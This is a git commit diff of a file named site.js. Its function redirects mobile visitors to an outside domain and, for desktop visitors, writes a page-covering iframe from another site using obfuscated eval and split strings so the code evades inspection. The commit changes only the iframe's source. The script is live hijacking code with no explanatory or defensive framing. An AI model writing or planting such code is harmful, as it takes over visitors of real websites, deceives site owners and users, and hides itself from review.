fbb42a2034abbb3d6021ef72445debaa321f7f31
mipcdn <50100918+mipcdn@users.noreply.github.com>
2019-05-06 17:27:09 +0800

    Update site.js

--- site.js
+++ site.js
@@ -2,7 +2,7 @@ function goPAGE() {
     if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
         window.location.href = "https://wap.xiaoaipan.cn/index.html"
     } else {
-        var ss = '<center id="yangchen"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="83' + '50" src="https://wap.xiaoaipan.cn/"></iframe></center>';
+        var ss = '<center id="yangchen"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="83' + '50" src="https://m.transcode.cn/c/s/wap.xiaoaipan.cn/"></iframe></center>';
         eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
         try {
             setInterval(function() {
